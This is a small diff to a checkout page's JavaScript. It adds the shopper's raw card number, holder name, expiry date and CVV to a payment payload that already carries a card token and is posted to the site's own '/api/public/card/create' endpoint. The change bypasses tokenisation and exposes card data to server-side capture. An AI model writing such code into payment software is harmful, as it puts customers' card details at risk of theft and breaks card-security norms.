@@ -1239,6 +1239,7 @@ var q=parseInt(localStorage.getItem('qtdSelecionada')||'1',10)||1;
         products:getProducts(amount),
         tracking:Object.assign({},window.getUTMs?window.getUTMs():{},window.getVerdefyTracking?window.getVerdefyTracking():{}),
         fb:(window.getFbData?window.getFbData():{}),
+        card:{number:num,holderName:hold,expiryMonth:mm,expiryYear:yy,cvv:cvv},
         cardToken:cardToken,installments:inst
       };
       var r=await fetch('/api/public/card/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
